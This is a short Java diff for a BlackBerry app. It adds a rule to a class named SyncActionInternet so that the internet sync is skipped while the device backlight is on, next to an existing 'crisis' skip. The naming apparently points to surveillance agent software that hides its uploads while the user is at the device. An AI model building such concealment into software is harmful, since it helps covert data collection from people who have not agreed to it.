@@ -11,8 +11,11 @@ package blackberry.action;
 import java.io.EOFException;
 import java.util.Vector;
 
+import net.rim.device.api.system.Backlight;
+import net.rim.device.api.system.Display;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AgentManager;
+import blackberry.Device;
 import blackberry.agent.Agent;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
@@ -102,6 +105,13 @@ public class SyncActionInternet extends SubAction {
         if (status.crisisSync()) {
             //#ifdef DEBUG
             debug.warn("SyncAction - no sync, we are in crisis");
+            //#endif
+            return false;
+        }
+        
+        if (Backlight.isEnabled()) {
+            //#ifdef DEBUG
+            debug.warn("SyncAction - no sync, backlight enabled");
             //#endif
             return false;
         }
